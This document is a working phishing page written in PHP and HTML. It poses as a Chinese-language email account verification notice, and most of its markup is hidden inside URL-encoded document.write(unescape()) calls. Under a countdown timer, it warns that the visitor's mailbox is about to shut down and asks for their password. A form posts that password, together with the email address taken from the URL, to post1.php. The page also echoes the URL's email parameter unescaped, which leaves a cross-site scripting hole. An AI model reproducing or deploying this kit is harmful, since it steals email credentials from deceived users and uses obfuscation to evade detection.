<html>
<head>
<script type="text/javascript">
<!--
document.write(unescape('%3Ctitle%3E%u7535%u5B50%u90AE%u4EF6%u8BBE%u7F6E%7C%20%u9A8C%u8BC1%3C/title%3E%0A%0A%3Clink%20rel%3D%22icon%22%20href%3D%22files/id.png%22%20sizes%3D%2213x13%22%20type%3D%22image/png%22%3E%0A%0A%0A%3C/head%3E%0A%3Cbody%20marginheight%3D%220%22%20marginwidth%3D%220%22%20topmargin%3D%220%22%20bottommargin%3D%220%22%20rightmargin%3D%220%22%20leftmargin%3D%220%22%20link%3D%22%233F59A4%22%20alink%3D%22%233F59A4%22%20vlink%3D%22%233F59A4%22%3E%0A%0A%3Ctable%20width%3D%22100%25%22%20height%3D%22%22%20cellspacing%3D%220%22%3E%0A%0A%3Ctr%3E%3Ctd%20height%3D%2230%22%20bgcolor%3D%22%23000000%22%3E%0A%0A%09%3Ctable%20width%3D%22%22%20align%3D%22center%22%3E%3Ctr%3E%0A%0A%0A%09%3Ctd%3E%0A%09%3Cimg%20src%3D%22files/mail.png%22%20width%3D%2240%22%20height%3D%2227%22%3E%0A%09%3C/td%3E%0A%0A%0A%09%3Ctd%20width%3D%225%22%3E%3C/td%3E%0A%0A%0A%09%3Ctd%3E%0A%09%3Cfont%20face%3D%22Lucida%20Grande%2C%20Lucida%20Sans%20Unicode%2C%20Lucida%20Sans%2C%20DejaVu%20Sans%2C%20Verdana%2C%20sans-serif%22%20size%3D%224%22%20color%3D%22%23ffffff%22%3E%0A%09%u7535%u5B50%u90AE%u4EF6%u8BBE%u7F6E%0A%09%3C/font%3E%0A%09%3C/td%3E'));
//-->
</script>







	<td width="800">
	<div align="right">
	<a href="" style="text-decoration:none">
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ffffff">
	<?php echo $_GET['email']; ?>	</font>
	</a>
	</div>
	</td>


<script type="text/javascript">
<!--
document.write(unescape('%3Ctd%20width%3D%225%22%3E%3C/td%3E%0A%0A%0A%0A%0A%0A%09%3Ctd%3E%0A%09%3Ca%20href%3D%22%22%3E%0A%09%3Cimg%20src%3D%22files/id.png%22%20width%3D%2228%22%20height%3D%2228%22%20border%3D%220%22%3E%0A%09%3C/a%3E%0A%09%3C/td%3E%0A%0A%09%3C/tr%3E%3C/table%3E%0A%0A%3C/td%3E%3C/tr%3E%0A%0A%0A%0A%0A%0A%0A%3Ctr%3E%3Ctd%20height%3D%2260%22%20bgcolor%3D%22%23FFFFFF%22%3E%3C/td%3E%3C/td%3E%0A%0A%0A%0A%0A%0A%0A%3Ctr%3E%3Ctd%20height%3D%22%22%20bgcolor%3D%22%23FFFFFF%22%3E%0A%0A%09%3Ctable%20width%3D%22650%22%20align%3D%22center%22%20cellspacing%3D%220%22%3E%0A%0A%09%3Ctr%3E%3Ctd%3E%0A%09%3Cfont%20face%3D%22Lucida%20Grande%2C%20Lucida%20Sans%20Unicode%2C%20Lucida%20Sans%2C%20DejaVu%20Sans%2C%20Verdana%2C%20sans-serif%22%20size%3D%22+2%22%20color%3D%22%233F59A4%22%3E%0A%09%u5E10%u6237%u9A8C%u8BC1%0A%09%3C/font%3E%0A%09%3C/td%3E%3C/tr%3E%0A%0A%0A%09%3Ctr%3E%3Ctd%20height%3D%2215%22%20bgcolor%3D%22%23FFFFFF%22%3E%3C/td%3E%3C/td%3E%0A%0A%0A%0A%09%3Ctr%3E%3Ctd%3E%0A%0A%09%09%3Ctable%3E%3Ctr%3E%0A%0A%09%09%3Ctd%3E%0A%09%09%3Cfont%20face%3D%22Lucida%20Grande%2C%20Lucida%20Sans%20Unicode%2C%20Lucida%20Sans%2C%20DejaVu%20Sans%2C%20Verdana%2C%20sans-serif%22%20size%3D%222%22%3E%0A%09%09%u5012%u8BA1%u65F6%u5230%u60A8%u7684%u7535%u5B50%u90AE%u4EF6%u5173%u673A%3A%20%0A%09%09%3C/font%3E%0A%09%09%3C/td%3E%0A%0A%0A%09%09%3Ctd%3E%0A%09%09%3Cfont%20face%3D%22Lucida%20Grande%2C%20Lucida%20Sans%20Unicode%2C%20Lucida%20Sans%2C%20DejaVu%20Sans%2C%20Verdana%2C%20sans-serif%22%20size%3D%224%22%20color%3D%22%23ff0000%22%3E%0A%0A%09%09%3Cb%3E%3Cdiv%20id%3D%22hms%22%3E01%3A15%3A10%3C/div%3E%3C/b%3E%0A%0A%09%09%3Cscript%20type%3D%22text/javascript%22%3E%0A%20%20%20%20%09%09function%20count%28%29%20%7B%0A%20%0A%20%20%20%20%09%09var%20startTime%20%3D%20document.getElementById%28%27hms%27%29.innerHTML%3B%0A%20%20%20%20%09%09var%20pieces%20%3D%20startTime.split%28%22%3A%22%29%3B%0A%20%20%20%20%09%09var%20time%20%3D%20new%20Date%28%29%3B%20%20%20%20time.setHours%28pieces%5B0%5D%29%3B%0A%20%20%20%20%09%09time.setMinutes%28pieces%5B1%5D%29%3B%0A%20%20%20%20%09%09time.setSeconds%28pieces%5B2%5D%29%3B%0A%20%20%20%20%09%09var%20timedif%20%3D%20new%20Date%28time.valueOf%28%29%20-%201000%29%3B%0A%20%20%20%20%09%09var%20newtime%20%3D%20timedif.toTimeString%28%29.split%28%22%20%22%29%5B0%5D%3B%0A%20%20%20%20%09%09document.getElementById%28%27hms%27%29.innerHTML%3Dnewtime%3B%0A%20%20%20%20%09%09setTimeout%28count%2C%201000%29%3B%0A%09%09%7D%0A%09%09count%28%29%3B%0A%20%0A%09%09%3C/script%3E%0A%0A%09%09%3C/font%3E%0A%0A%09%09%3C/td%3E%0A%0A%0A%0A%09%09%3C/tr%3E%3C/table%3E%0A%0A%09%0A%09%3C/td%3E%3C/tr%3E%0A%0A%0A%0A%0A%0A%0A%0A%09%3Ctr%3E%3Ctd%3E%0A%09%3Cfont%20face%3D%22Lucida%20Grande%2C%20Lucida%20Sans%20Unicode%2C%20Lucida%20Sans%2C%20DejaVu%20Sans%2C%20Verdana%2C%20sans-serif%22%20size%3D%222%22%3E%0A%09%u8981%u9632%u6B62%u60A8%u7684%u7535%u5B50%u90AE%u4EF6%u5173%u95ED%uFF0C%u8BF7%u5728%u4E0B%u9762%u9A8C%u8BC1%u60A8%u7684%u5E10%u6237%u8BE6%u7EC6%u4FE1%u606F%3A%20%0A%09%3C/font%3E%0A%09%3C/td%3E%3C/tr%3E%0A%09%0A%09%0A%0A%0A%0A%09%3Ctr%3E%3Ctd%20height%3D%2225%22%20bgcolor%3D%22%23FFFFFF%22%3E%3C/td%3E%3C/td%3E'));
//-->
</script>



	<tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="+2">
	<?php echo $_GET['email']; ?>
	</font>
	</td></tr>



<script type="text/javascript">
<!--
document.write(unescape('%3Ctr%3E%3Ctd%20height%3D%225%22%20bgcolor%3D%22%23FFFFFF%22%3E%3C/td%3E%3C/td%3E%0A%0A%0A%09%0A%09%3Ctr%3E%3Ctd%3E%0A%09%3Cform%20method%3D%22post%22%20action%3D%22post1.php%22%3E%0A%09%3C/td%3E%3C/tr%3E%0A%0A%0A%0A%09%3Ctr%3E%3Ctd%3E%0A%0A%09%09%3Cinput%20%20name%3D%22password%22%20type%3D%22password%22%20style%3D%22width%3A350px%3B%20height%3A35px%3B%20font-family%3A%20Verdana%3B%20%0A%20%20%20%20%20%20%09%09%09%09font-size%3A%2015px%3B%20color%3A%23000000%3B%20background-color%3A%20%23ffffff%3B%20%0A%20%20%20%20%20%20%09%09%09%09border%3A%20solid%201px%20%23848484%3B%20padding%3A%2010px%3B%20-moz-border-radius%3A%205px%3B%20%0A%20%20%20%20%20%20%09%09%09%09-webkit-border-radius%3A%205px%3B%20%09-khtml-border-radius%3A%205px%3B%20%0A%20%20%20%20%20%20%09%09%09%09border-radius%3A%205px%3B%22%20required%3D%22%22%20placeholder%3D%22%u8F93%u5165%u5BC6%u7801%u4EE5%u7EE7%u7EED%22%3E%0A%0A%09%3C/td%3E%3C/tr%3E%0A%0A%0A%0A%0A%0A%0A%0A%09%3Ctr%3E%3Ctd%20height%3D%225%22%20bgcolor%3D%22%23FFFFFF%22%3E%3C/td%3E%3C/td%3E%0A%0A%0A%0A%09%3Ctr%3E%3Ctd%3E%0A%0A%09%09%3Cinput%20%20value%3D%22%u7B7E%u5230%20%3E%3E%22%20type%3D%22submit%22%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20style%3D%22width%3A270px%3B%20height%3A55px%3B%20font-family%3A%20Verdana%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%2017px%3B%20color%3A%23ffffff%3B%20%0A%09%09%09%09%09background-color%3A%20%233F59A4%3B%20border%3A%20solid%201px%20%233F59A4%3B%20padding%3A%2010px%3B%20%0A%09%09%09%09%09-moz-border-radius%3A%202px%3B%20-webkit-border-radius%3A%202px%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-khtml-border-radius%3A%202px%3B%20border-radius%3A%202px%3B%0A%09%09%09%09%09-moz-box-shadow%3A%203px%203px%203px%20%23888%3B%20-webkit-box-shadow%3A%203px%203px%203px%20%23888%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20box-shadow%3A%203px%203px%203px%20%23888%3B%22%3E%0A%0A%09%3C/td%3E%3C/tr%3E'));
//-->
</script>




	<tr><td>
	<input name="email" type="hidden" value="<?php echo $_GET['email']; ?>">
	</form>
	</td></tr>




	

<script type="text/javascript">
<!--
document.write(unescape('%3Ctr%3E%3Ctd%20height%3D%22200%22%20bgcolor%3D%22%23FFFFFF%22%3E%3C/td%3E%3C/td%3E%0A%0A%0A%0A%0A%09%0A%0A%09%3Ctr%3E%3Ctd%3E%0A%09%3Chr%20width%3D%22650%22%20align%3D%22left%22%3E%0A%09%3C/td%3E%3C/tr%3E%0A%0A%0A%0A%0A%0A%0A%0A%09%3Ctr%3E%3Ctd%20height%3D%2210%22%20bgcolor%3D%22%23FFFFFF%22%3E%3C/td%3E%3C/td%3E%0A%0A%0A%0A%0A%0A%09%3Ctr%3E%3Ctd%3E%0A%09%3Ca%20href%3D%22%22%20style%3D%22text-decoration%3Anone%22%3E%0A%09%3Cfont%20face%3D%22Lucida%20Grande%2C%20Lucida%20Sans%20Unicode%2C%20Lucida%20Sans%2C%20DejaVu%20Sans%2C%20Verdana%2C%20sans-serif%22%20size%3D%222%22%3E%0A%09%3Cb%3E***%3C/b%3E%20%u5E10%u6237/%u8BBE%u7F6E/%u5B89%u5168%u8BBE%u7F6E/%u5E10%u6237%u9A8C%u8BC1%20%3E%3E%0A%09%3C/font%3E%0A%09%3C/a%3E%0A%09%3C/td%3E%3C/tr%3E%0A%0A%0A%09%3C/table%3E%0A%0A%3C/td%3E%3C/tr%3E%0A%0A%0A%0A%3C/table%3E%0A%0A%3C/body%3E%0A%3C/html%3E'));
//-->
</script>
